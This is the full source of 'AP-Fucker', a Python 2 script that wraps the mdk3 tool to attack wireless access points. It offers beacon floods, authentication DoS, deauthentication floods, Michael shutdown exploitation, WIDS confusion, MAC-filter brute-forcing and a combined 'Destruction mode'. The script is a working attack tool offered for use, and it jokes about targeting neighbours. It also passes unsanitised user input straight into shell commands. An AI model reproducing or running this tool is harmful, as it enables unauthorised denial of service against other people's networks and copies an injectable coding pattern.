#!/usr/bin/env python
# -*- coding: Utf-8 -*-
#
# WIRELESS ACCESS POINT FUCKER
# Interactive, Multifunction, Destruction Mode Included
#
# Thanks to BackTrack crew, especially ShamanVirtuel and ASPJ
#
# USAGE: Launch the script as root using "python AP-Fucker.py", follow instructions, enjoy!
# Prerequisites: Have mdk3 installed
#

__app__ = "AP-Fucker"
__version__ = "0.5"
__author__ = "MatToufoutu"

### IMPORTS
from sys import stdout
from sys import exit as sysexit
from os import system, remove, path
from commands import getoutput
from threading import Thread
from time import sleep, ctime

### MDK3 THREADED ATTACKS CLASS
class Mdk3(Thread):
    def __init__(self, attack, attack_options):
        Thread.__init__(self)
        self.attack = attack
        self.iface = attack_options[0]
        self.essid = attack_options[1]
        self.bssid = attack_options[2]
        self.chan = attack_options[3]
        self.log = "apfucker.log"
        self.modes = {"B":self.bflood, "A":self.ados, "D":self.amok,
                      "M":self.mich, "W":self.wids, "C":self.brutmac}
    def bflood(self):
        out = open(self.log,"a")
        out.write("\n ----- "+ctime()+" : Launching beacon flood against %s on channel %s -----" % (self.essid, self.chan))
        out.close()
        print("\n Launching beacon flood against %s on channel %s" % (self.essid, self.chan))
        sleep(2)
        system("mdk3 "+self.iface+" b -n "+self.essid+" -g -w -m -c "+self.chan+" >> "+self.log)
    def ados(self):
        out = open(self.log,"a")
        out.write("\n ----- "+ctime()+" : Launching Auth DoS against %s -----" % (self.bssid))
        out.close()
        print("\n Launching Auth DoS against %s " % (self.bssid))
        sleep(2)
        system("mdk3 "+self.iface+" a -i "+self.bssid+" -m -s 1024 >> "+self.log)
    def amok(self):
        out = open(self.log,"a")
        out.write("\n ----- "+ctime()+" : Launching Deauth Flood 'Amok' Mode on channel %s -----" % (self.chan))
        out.close()
        print("\n Launching Deauth Flood 'Amok' Mode on channel %s" % (self.chan))
        sleep(2)
        system("mdk3 "+self.iface+" d -c "+self.chan+" -s 1024 >> "+self.log)
    def mich(self):
        out = open(self.log,"a")
        out.write("\n ----- "+ctime()+" : Launching Michael 'Shutdown' Exploitation against %s on channel %s -----" % (self.bssid, self.chan))
        out.close()
        print("\n Launching Michael 'Shutdown' Exploitation against %s on channel %s" % (self.bssid, self.chan))
        sleep(2)
        system("mdk3 "+self.iface+" m -t "+self.bssid+" -j -w 1 -n 1024 -s 1024 >> "+self.log)
    def wids(self):
        out = open(self.log,"a")
        out.write("\n ----- "+ctime()+" : Launching WIDS Confusion against %s on channel %s -----" % (self.essid, self.chan))
        out.close()
        print("\n Launching WIDS Confusion against %s on channel %s" % (self.essid, self.chan))
        sleep(2)
        system("mdk3 "+self.iface+" w -e "+self.essid+" -c "+self.chan+" >> "+self.log)
    def brutmac(self):
        global runanim
        runanim = True
        out = open(self.log, "a")
        out.write("\n ----- "+ctime()+" : Launching MAC filter Brute-Forcer against %s -----\n" % (self.bssid))
        print("\n Launching MAC filter Brute-Forcer against %s" % (self.bssid))
        sleep(2)
        macfound = getoutput("mdk3 "+self.iface+" f -t "+self.bssid).splitlines()[-2:]
        runanim = False
        sleep(1)
        print; print
        for line in macfound:
            print(line)
            out.write("\n"+line)
        out.close()
        print
        sysexit(0)
    def run(self):
        global runanim
        runanim = True
        self.modes[self.attack]()
        runanim = False

### AUXILIARY FUNCTIONS
## CHECK IF IFACE IS IN MONITOR MODE
def check_mon(iface):
    for line in getoutput("iwconfig "+iface).splitlines():
        if "Mode:Monitor" in line:
            return True
    return False

## CHECK IF BSSID IS VALID
def check_mac(ap):
    if len(ap) != 17 or ap.count(':') != 5:
        return False
    macchar = "0123456789abcdef:"
    for c in ap.lower():
        if macchar.find(c) == -1:
            return False
    return True

## CHECK IF CHANNEL IS VALID
def check_chan(iface, chan):
    if chan.isdigit():
        channel = int(chan)
        if not channel in range(1, int(getoutput("iwlist "+iface+" channel | grep channels | awk '{print $2}'"))+1):
            return False
    else:
        return False
    return True

## CLEAN EXIT
def clean_exit():
    print;print
    print("\nAction aborted by user. Exiting now")
    for pid in getoutput("ps aux | grep mdk3 | grep -v grep | awk '{print $2}'").splitlines():
        system("kill -9 "+pid)
    print("Hope you enjoyed it ;-)")
    sleep(2)
    system("clear")
    sysexit(0)

## DUMMY WAITING MESSAGE (ANIMATED)
def waiter(mess):
    try:
        stdout.write("\r | "+mess)
        stdout.flush()
        sleep(0.15)
        stdout.write("\r / "+mess)
        stdout.flush()
        sleep(0.15)
        stdout.write("\r-- "+mess)
        stdout.flush()
        sleep(0.15)
        stdout.write("\r \\ "+mess)
        stdout.flush()
        sleep(0.15)
        stdout.write("\r | "+mess)
        stdout.flush()
        sleep(0.15)
        stdout.write("\r / "+mess)
        stdout.flush()
        sleep(0.15)
        stdout.write("\r-- "+mess)
        stdout.flush()
        sleep(0.15)
        stdout.write("\r \\ "+mess)
        stdout.flush()
        sleep(0.15)
    except KeyboardInterrupt:
        clean_exit()

### MAIN APP
try:
    import psyco
    psyco.full()
except ImportError:
    pass

attackAvail = ["B", "A", "W", "D", "M", "T", "E", "C"]
attack_opt = []

if getoutput("whoami") != "root":
    print("This script must be run as root !")
    sysexit(0)
try:
    system("clear")
    print("\n\t\t########## ACCESS POINT FUCKER ##########\n")
    print("""Choose your Mode:
    \t - (B)eacon flood
    \t - (A)uth DoS
    \t - (W)ids confusion
    \t - (D)isassociation 'AmoK Mode'
    \t - (M)ichael shutdown exploitation
    \t - MA(C) Filter Brute-Forcer
    \t - Des(T)ruction mode (USE WITH CAUTION)\n""")

    ## GET MODE
    while 1:
        mode = raw_input("\n>>> ")
        if mode.upper() not in attackAvail:
            print("  '%s' is not a valid mode !" % mode)
        else:
            break

    ## GET INTERFACE
    while 1:
        iface = raw_input("\nMonitor interface to use: ")
        if check_mon(iface):
            attack_opt.append(iface)
            break
        else:
            print("%s is not a Monitor interface, try again or hit Ctrl+C to quit" % iface)

    ## GET ESSID
    if mode.upper() == "B" or mode.upper() == "W" or mode.upper() == "T":
        attack_opt.append("\""+raw_input("\nTarget ESSID: ")+"\"")
    else:
        attack_opt.append(None)

    ## GET BSSID
    if mode.upper() == "A" or mode.upper() == "M" or mode.upper() == "T" or mode.upper() == "C":
        while 1:
            bssid = raw_input("\nTarget BSSID: ")
            if check_mac(bssid):
                attack_opt.append(bssid)
                break
            else:
                print("Invalid BSSID, try again or hit Ctrl+C to quit")
    else:
        attack_opt.append(None)

    ## GET CHANNEL
    if mode.upper() != "C":
        while 1:
            channel = raw_input("\nTarget channel: ")
            if check_chan(iface, channel):
                attack_opt.append(channel)
                break
            else:
                print("Channel can only be 1 to 14, try again or hit Ctrl+C to quit")
    else:
        attack_opt.append(None)

    ## LAUNCH SELECTED ATTACK
    if path.exists("apfucker.log"):
        remove("apfucker.log")
    if mode.upper() != "T":
        system('clear')
        Mdk3(mode.upper(), attack_opt).start()
        sleep(1)
        print; print; print
        while runanim:
            waiter("   ATTACK IS RUNNING !!! HIT CTRL+C TWICE TO STOP THE TASK...")
    else:
        system('clear')
        print("\n\t/!\\/!\\/!\\ WARNING /!\\/!\\/!\\\n")
        print(" You've choosen DESTRUCTION MODE")
        print(" Using this mode may harm your WiFi card, use it at your own risks.")
        validate = raw_input(" Do you wish to continue? (y/N): ")
        if validate.upper() != "Y":
            print(" Ok, exiting now")
            sysexit(0)
        else:
            out = open("apfucker.log","a")
            out.write("\n ----- "+ctime()+" : Launching Destruction Combo. Target is AP %s|%s on channel %s -----" % (attack_opt[1], attack_opt[2], attack_opt[3]))
            out.close()
            print("\n Launching Destruction Combo\n Target is AP %s|%s on channel %s" % (attack_opt[1], attack_opt[2], attack_opt[3]))
            print(" Please be kind with your neighbours xD")
            ##wids not implemented: may raise segfault
            ##appears to be an internal mdk3 issue when running multiple attacks
            for atk in ("B", "A", "D", "M"):
                Mdk3(atk, attack_opt).start()
            sleep(1)
            print; print; print
            while runanim:
                waiter("   DESTRUCTION COMBO IS RUNNING !!! HIT CTRL+C TWICE TO STOP THE TASK...")
except KeyboardInterrupt:
    clean_exit()
